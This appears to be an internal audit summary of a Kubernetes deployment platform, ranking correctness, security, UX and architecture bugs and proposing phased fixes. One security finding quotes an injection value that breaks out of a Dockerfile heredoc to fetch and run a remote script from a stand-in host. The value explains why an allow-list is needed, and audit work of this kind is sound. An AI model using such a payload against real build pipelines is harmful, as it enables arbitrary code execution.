## P0 ship-blockers

Ranked by impact × likelihood:

| # | ID | Area | What breaks |
|---|----|------|-------------|
| 1 | **Correct P0-3** | `buildcontroller/buildcontroller.go:Start` + `buildreaper/buildreaper.go:Start` | **Informer handler accumulates across leader re-elections.** `startSingletons` runs each time a replica acquires the lease; each call constructs a fresh `Service{}` and registers a *new* event handler against the *shared* informer in `kc.Cache`. After N re-elections every KusoBuild event fires N reconcile closures. Each closure has its own `running` dedup map — they don't see each other, so the dedup is useless across closures. Symptom: duplicate Job-create requests, log noise, conflict storms during a rolling restart. |
| 2 | **Correct P0-2** | `kube/crds.go:213` (`update[T]`) | **Lost-write on 409.** The retry path bumps the caller's stale snapshot's `resourceVersion` and resends — overwriting the live state with our pre-conflict spec. `UpdateKusoEnvironment` / `UpdateKusoAddon` / `UpdateKusoCron` all go through this. `propagateChangedToEnvs` writes N env CRs sequentially through it; a helm-operator status patch landing mid-loop quietly wipes our env spec on retry. (The `*WithRetry` variants do RMW correctly; `UpdateKuso*` does not.) F-03 fixed the same pattern for KusoService callers; the rest were missed. |
| 3 | **Sec F-07/F-08** | `deploy/server-go.yaml` (kuso-server ClusterRole) | **kuso-server SA holds cluster-wide `secrets:*` + `pods/exec:create`.** Single RCE on kuso-server → every Secret on the cluster (k3s SA signing key in `kube-system`, the cnpg cluster's tls, etc.) + exec into any pod including control-plane. `pods/exec` is unused (CLI does the exec locally); removing it costs nothing. Secret scope should be limited to `kuso.sislelabs.com/managed-by=kuso` namespaces. |
| 4 | **Sec F-02** | `server-go/internal/buildcontroller/buildcontroller.go:Start` | **Build controller reconciles any KusoBuild CR cluster-wide.** No namespace ownership check. An admin (or compromised kuso-server) can apply a KusoBuild CR in `kube-system` and get a build pod scheduled there — `kube-system` doesn't carry `pod-security.kubernetes.io/enforce=restricted`, so the build pod runs in a less-restricted PSS context. |
| 5 | **Sec F-03** | `buildcontroller/render.go:renderStaticPlanContainer` | **Static build `runtimeImage` and `outputDir` aren't validated.** `cat > .kuso-static.Dockerfile <<EOF` then `FROM $RUNTIME_IMAGE / COPY $OUTPUT_DIR ...`. A Deployer setting `runtimeImage: "scratch\nRUN curl evil.sh | sh"` (with literal newlines) breaks out of the heredoc and runs arbitrary shell in the build container. `repoPathRE` validator exists at the create-service boundary; an analogous allow-list is missing here. |
| 6 | **UX P0-A** | `web/src/app/(app)/welcome/page.tsx:194-215` | **Non-admin first-user dead-ends at /welcome.** When `installURL.isError` fires (non-admins can't read the GitHub install URL), the only options are a "ask an admin" sentence + a Skip button that loops through /projects → /awaiting-access. New invitees who land here on day 1 have no escape. |
| 7 | **UX P0-B** | `web/src/app/(app)/welcome/page.tsx:213` + `services/new/view.tsx:159-186` | **"Skip GitHub" is a circular path.** Skip → /projects/new → /projects (empty canvas) → `+ Add service` → re-presents the same GitHub install requirement. There's no "deploy from a Docker image" or "wire git later" peer action on the empty canvas, so a user without an installable GitHub App can't get to first compute. |
| 8 | **UX P0-C** | `web/src/components/service/overlay/ServiceDeploymentsPanel.tsx:260-345` | **Build-failure cause is hidden under 200-600 lines of kaniko/buildkit log noise.** Deployments tab shows FAILED + SHA + duration with no error summary. Users hand-grep kaniko logs at 2am. A regex-scan on the build poller's side (`error:`, `FATAL`, `panic:`, `EXIT 1`, etc.) stamping `errorHint` + `errorLine` onto BuildSummary, rendered as a sticky red banner above the log viewport with jump-to-line, closes the recovery loop. |
| 9 | **Arch P0-1 + P0-2** | `projects.Service` (53 methods × 9 files) + `db.DB` (140 methods × 29 files) | **Two god structs are the structural debt.** Adding any new feature involves grepping a god-struct surface; every handler imports the whole thing. Test stubs have to mock or fake the entire receiver. The fix is mechanical (extract per-domain repos / sub-services) but the lift is L. Until landed, the codebase keeps accumulating "yet another method on Service" entropy. |

## Cross-cutting themes

### Theme 1 — The same bug class hides in many sites

The 14-call-site Dynamic.List bypass (arch P1-1), the lost-write-on-409 in `UpdateKusoEnvironment/Addon/Cron` (correct P0-2), the propagation-error swallow in SetEnvWithOpts (arch P1-7) — all are the same shape: **the safe path exists, the unsafe path was copy-pasted alongside it**, and grep doesn't find the unsafe sites because they don't share a name. Three concrete fix windows:

- **F-03 fix didn't generalise.** UpdateKusoServiceWithRetry was added for the F-03 fix; nobody made UpdateKusoEnvironmentWithRetry, UpdateKusoAddonWithRetry, UpdateKusoCronWithRetry. Add them and migrate the call sites.
- **Cache vs Dynamic.List.** kube/cache.go was built for this; add ListKusoEnvironmentsByLabels + ListKusoBuildsByLabels and sweep the 14 sites.
- **Propagation errors.** Logger isn't plumbed into `projects.Service`, so swallowed errors stay silent. One field add fixes 4+ call sites.

### Theme 2 — Test coverage on freshly-extracted code is zero

Every refactor in v0.10.0 (migration extract, buildcontroller, mapping promotion) shipped without tests on the new package boundary:

- `internal/migration` — zero tests, even though it commits 50 CRs/click
- `internal/crons` — zero tests despite 3-shape complexity + lying schedule validator (accepts Quartz `?`)
- `internal/buildcontroller/buildcontroller.go` — render_test.go covers the render side, the Run loop is untested
- `internal/buildreaper` — has tests for `isDone` but not Start/reapHelmSecrets

When the next regression hits one of these (informer handler dup, slug collision, schedule-validator drift), it'll surface as a production incident, not a CI failure.

### Theme 3 — Two trust-boundary gaps inside the build pipeline

The architecture / security pass intersects on the build pipeline. **(a)** Build controller doesn't check namespace ownership before reconciling. **(b)** Static build's runtimeImage/outputDir aren't validated. **(c)** kuso-server SA's overbroad ClusterRole means an RCE through any handler (Coolify import response handling, OAuth callback, webhook receiver) gives the attacker `secrets:list cluster-wide`. The three together are the failure mode for a "trusted admin pushed a malicious commit" scenario — exactly the case kuso's threat model needs to handle in a multi-developer single team.

### Theme 4 — The product is best-in-class for the happy path, worst-in-class for the 2am path

UX pass + correctness pass both flagged this. Build-failure cause is buried; non-admins dead-end; the canvas empty state doesn't recover from "GitHub App isn't installable here." The whole stack is built for "everything is green and the deploy worked" — when it didn't, you reach for the CLI + grep + kubectl. A v0.11 theme should be **"every red dot has a one-line cause + a one-click fix attempt"**: build failure → regex-scan log for `error:`; addon storage warning → "click to resize"; cert ACME failure → "retry now / use HTTP".

## Recommended phasing

**Phase 6a — correctness P0s (~half day):**
- Correct P0-2 — port `propagateChangedToEnvs` (and any other `UpdateKusoEnv*/Addon/Cron` callers) to retry-on-409 with mutate closure. Add `UpdateKusoEnvironmentWithRetry` etc.
- Correct P0-3 — `Start()` in buildcontroller + buildreaper uses `sync.Once` (or moves the AddEventHandler call to one-shot init at boot, gated on leader-active for the per-event work). Drop the per-instance `running` map; use a leader-scoped set keyed on UID.

**Phase 6b — security P0/P1s (~1 day):**
- Sec F-07/F-08 — tighten kuso-server ClusterRole (drop pods/exec, scope secrets to managed namespaces, scope CRD verbs to our API group).
- Sec F-02 — namespace ownership check in buildcontroller's reconcile path (skip CRs in non-managed namespaces with a loud log line).
- Sec F-03 — static-build value allow-list (OCI ref regex for runtimeImage; the existing repoPathRE for outputDir).

**Phase 6c — UX P0s (~1 day):**
- UX P0-C — build error extraction: build poller regex-scans on terminal transitions, stamps the hit into a CR annotation; the Deployments panel renders a sticky red banner above the log viewport.
- UX P0-B — empty-state on /projects/new and the canvas needs a peer "deploy a pre-built image" action so a user without a GitHub App can get to first compute.
- UX P0-A — "notify your admin" affordance on the GitHub-blocked welcome path (emits a notification event to admin users).

**Phase 6d — test coverage on extracted packages (~half day):**
- migration_test.go (table-driven groupPicked/importOneProject/slug-collision)
- crons_test.go (validateSchedule with Quartz inputs, SyncFromService on missing-prod-env)
- buildcontroller Run-loop dedup test (informer event replay → single reconcile)

**Phase 6e — architecture P0s (multi-week, headline for v0.11):**
- Arch P0-1 — projects.Service split: `projects/envgroup`, `projects/drift`, `projects/propagate` as siblings.
- Arch P0-2 — db.DB split: per-domain repos (`db.Users`, `db.Tokens`, etc.). Big lift; biggest test-stub payoff.
- Arch P0-3 — builds/builds.go file split (mechanical, half day).

Phases 6a-6d together are ~3 days end-to-end and close every P0. Phase 6e is the v0.11 architecture theme.
